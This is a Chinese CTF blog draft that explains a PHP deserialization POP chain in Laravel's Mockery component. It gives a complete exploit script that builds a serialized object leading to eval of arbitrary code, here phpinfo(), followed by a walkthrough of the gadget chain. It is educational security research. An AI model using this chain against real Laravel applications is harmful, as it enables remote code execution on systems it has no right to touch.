---
title: 'POP链挖掘'
date: 2019-01-01
category: 'ctf那些事儿'
tags: []
lang: 'zh'
draft: true
---
## Laravel mockery组件

exp:

```
<?php
namespace Illuminate\Broadcasting{
  class PendingBroadcast
  {
    protected $event;
    protected $events;

    public function __construct($events,$event)
    {
      $this->events = $events;
      $this->event = $event;
    }
  }
}

namespace Illuminate\Bus{
  class Dispatcher
  {
    protected $queueResolver;

    public function __construct($queueResolver)
    {
      $this->queueResolver = $queueResolver;
    }
  }
}

namespace Illuminate\Broadcasting{
  class BroadcastEvent
  {
    public $connection;

    public function __construct($connection)
    {
      $this->connection = $connection;
    }
  }
}

namespace Mockery\Generator{
  class MockDefinition
  {
    protected $config;
    protected $code = '<?php phpinfo();?>';

    public function __construct($config)
    {
      $this->config = $config;
    }
  }
}

namespace Mockery\Generator{
  class MockConfiguration
  {
    protected $name = '1234';
  }
}

namespace Mockery\Loader{
  class EvalLoader
  {
     public function load(MockDefinition $definition)
     {

     }
  }
}

namespace{
  $Mockery = new Mockery\Loader\EvalLoader();
  $queueResolver = array($Mockery, "load");
  $MockConfiguration = new Mockery\Generator\MockConfiguration();
  $MockDefinition = new Mockery\Generator\MockDefinition($MockConfiguration);
  $BroadcastEvent = new Illuminate\Broadcasting\BroadcastEvent($MockDefinition);
  $Dispatcher = new Illuminate\Bus\Dispatcher($queueResolver);
  $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($Dispatcher,$BroadcastEvent);
  echo urlencode(serialize($PendingBroadcast));
}
?>
```

构造过程

入口类： `PendingBroadcast`
![](https://upload-images.jianshu.io/upload_images/10651191-bacfb14e55649c24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
这里的 `$this->events` 是 `Dispatcher` 接口的，这里我们找到一个实现了 `Dispatcher` 接口的类

![](https://upload-images.jianshu.io/upload_images/10651191-53fbd58b12ec0f73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

跟进
![](https://upload-images.jianshu.io/upload_images/10651191-925e35d3a72da56e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
看一下 `commandShouldBeQueued` 方法

![](https://upload-images.jianshu.io/upload_images/10651191-7bb345e0966b0ad8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

要求 `$command` 实现了 `ShouldQueue` 接口，注意此时的 `$command` 其实就是 `PendingBroadcast `的 `$event`(是可控的)

![](https://upload-images.jianshu.io/upload_images/10651191-d6a9487eb5ffdf41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
找到其中一个类 `BroadcastEvent`，我们可以将 `PendingBroadcast` 的 `$event` 覆盖为 `BroadcastEvent`

继续跟进 `dispatchToQueue` 方法，看到 `call_user_func` 方法

![](https://upload-images.jianshu.io/upload_images/10651191-3a9964d202b5e422.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
注意此时的 `$command` 其实已经覆盖为 `BroadcastEvent` 类了，`connetcion` 属性可控

此时我们要考虑调用哪个函数，这里使用了 `EvalLoader` 类

![](https://upload-images.jianshu.io/upload_images/10651191-75670fa364790bcc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

如果要调用这个函数，那么 if 条件必须是 false，查看 `MockDefinition` 类

![](https://upload-images.jianshu.io/upload_images/10651191-c48af422ec7b394c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

覆盖 `$this-config` 为 `MockConfiguration` 这个类，给它的 name 属性随便赋值即可

![](https://upload-images.jianshu.io/upload_images/10651191-362f515910992517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
ok就到这里了
